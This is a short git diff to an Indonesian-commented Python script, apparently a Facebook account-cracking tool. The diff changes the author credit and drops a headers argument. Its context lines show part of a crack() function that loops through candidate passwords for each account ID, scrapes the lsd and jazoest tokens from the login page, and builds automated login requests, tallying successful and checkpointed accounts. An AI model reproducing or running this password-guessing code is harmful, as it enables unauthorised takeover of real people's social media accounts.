@@ -1,7 +1,7 @@
 ###---[ INFO AUTHOR GANS DIKIT ]---###
 #----[ jangan di oprek, sayangi data hpmu ]-----#
-author = 'Rochmat Basuki'
-git_hub = 'github.com/RozhBasXYZ'
+author = 'Linkz'
+git_hub = 'github.com/Linkz042'
 faceb0ok = 'ROCHMAT BASUKI XD'
 version = 'next blade v.1'
 
@@ -642,7 +642,7 @@ def crack(idf,pwx,url,awal):
 	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
-			link = ses.get(f'https://{url}/login/?source=auth_switcher', headers=hd1)
+			link = ses.get(f'https://{url}/login/?source=auth_switcher')
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
